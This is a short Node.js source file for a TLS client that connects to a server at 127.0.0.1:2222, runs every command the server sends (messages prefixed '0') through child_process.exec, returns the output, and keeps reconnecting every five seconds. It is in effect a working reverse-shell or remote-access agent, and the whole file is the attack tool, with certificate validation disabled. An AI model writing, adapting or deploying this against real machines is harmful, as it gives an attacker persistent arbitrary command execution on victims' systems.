const readline = require('readline')
const tls = require('tls')
const  fs = require('fs')
const { exec } = require('child_process');
const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

const options = {
    key: fs.readFileSync('client-cert/private-key.pem'),
    cert: fs.readFileSync('client-cert/public-cert.pem'),
    rejectUnauthorized: false
}

let reconnect = false;

const serverConnect = () => {
    const client = tls.connect(2222,'127.0.0.1', options)

    client.on('secure', () => {
        stopReconnect()
        console.log('Connected!')
    })
    
    client.on('data', (data) => {
        msg = data.toString()
    
        switch (msg[0]) {
            case '0':
                exec(msg.substr(1), (err, stdout, stderr) => {
                    if (err) {
                        client.write(`error: ${err.message}`);
                        return;
                    }
                    if (stderr) {
                        client.write(`stderr: ${stderr}`);
                        return;
                    }
                    client.write(stdout);
                })
                break
            case '1':
                console.log('Server: ' + msg.substr(1))
                break
        }
    })
    
    
    client.on('close', () => {
        console.log('Connection closed...attempting reconnection...')
        client.destroy()
        attemptReconnect()
    })
    
    client.on('error', (error) => {
        console.log(error)
        client.destroy()
        attemptReconnect()
    })
}

const attemptReconnect = () => {
    if (reconnect != false) return
    reconnect = setInterval(serverConnect, 5000)
}

const stopReconnect = () => {
    if (reconnect == false) return
    clearInterval(reconnect)
    reconnect = false
}

serverConnect()